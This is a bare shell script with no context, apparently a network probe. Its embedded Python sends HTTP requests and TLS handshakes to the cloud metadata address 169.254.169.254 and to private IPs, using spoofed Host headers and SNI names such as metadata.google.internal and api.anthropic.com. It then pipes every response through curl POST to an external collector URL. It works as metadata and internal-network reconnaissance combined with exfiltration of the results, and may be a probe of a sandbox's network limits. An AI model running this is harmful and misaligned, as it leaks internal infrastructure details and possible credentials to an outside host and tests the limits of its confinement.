(
set -x

python3 - <<'PY'
import socket, ssl

def http_probe(dst, host_header, path="/"):
    print(f"=== HTTP dst={dst}:80 Host={host_header} path={path} ===")
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"User-Agent: audit-probe\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((dst, 80))
        s.sendall(req)
        out = b""
        while True:
            try:
                chunk = s.recv(2048)
            except socket.timeout:
                break
            if not chunk:
                break
            out += chunk
            if len(out) >= 4096:
                break
        print(out.decode("utf-8", "replace")[:4096])
    except Exception as e:
        print("FAIL", type(e).__name__, e)
    finally:
        s.close()

def tls_probe(dst, sni):
    print(f"=== TLS dst={dst}:443 SNI={sni} ===")
    raw = socket.socket()
    raw.settimeout(3)
    try:
        raw.connect((dst, 443))
        ctx = ssl.create_default_context()
        ss = ctx.wrap_socket(raw, server_hostname=sni)
        print("TLS_OK", ss.version(), ss.cipher())
        cert = ss.getpeercert()
        print("CERT_SUBJECT", cert.get("subject"))
        print("CERT_SAN", cert.get("subjectAltName")[:10] if cert.get("subjectAltName") else None)
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {sni}\r\n"
            f"User-Agent: audit-probe\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        ss.sendall(req)
        out = b""
        while True:
            try:
                chunk = ss.recv(2048)
            except socket.timeout:
                break
            if not chunk:
                break
            out += chunk
            if len(out) >= 4096:
                break
        print(out.decode("utf-8", "replace")[:4096])
        ss.close()
    except Exception as e:
        print("FAIL", type(e).__name__, e)
        try:
            raw.close()
        except Exception:
            pass

# Private/reserved destination with various authorities.
for dst in ["169.254.169.254", "10.0.0.1", "100.64.0.1"]:
    for host in [
        dst,
        "metadata.google.internal",
        "example.com",
        "api.anthropic.com",
        "www.google.com",
    ]:
        http_probe(dst, host)

# Compare TLS SNI behavior on private/reserved IPs.
for dst in ["169.254.169.254", "10.0.0.1", "100.64.0.1"]:
    for sni in ["example.com", "api.anthropic.com", "www.google.com", "metadata.google.internal"]:
        tls_probe(dst, sni)
PY
) 2>&1 | curl -s -m 20 -X POST --data-binary @- "$COLLECTOR_URL"
